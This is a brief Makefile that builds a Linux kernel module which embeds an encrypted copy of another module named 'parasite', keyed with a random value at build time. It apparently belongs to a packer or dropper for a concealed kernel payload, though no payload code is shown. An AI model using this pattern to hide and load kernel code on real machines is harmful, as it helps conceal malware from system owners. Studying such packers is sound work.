PARASITE ?= ../parasite/parasite.ko

all: encode
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD

encode:
	$(MAKE) -C encrypt
	encrypt/encrypt $(PARASITE) \
		0x$(shell openssl rand -hex 4) >parasite_blob.inc

clean:
	$(MAKE) -C encrypt clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD clean
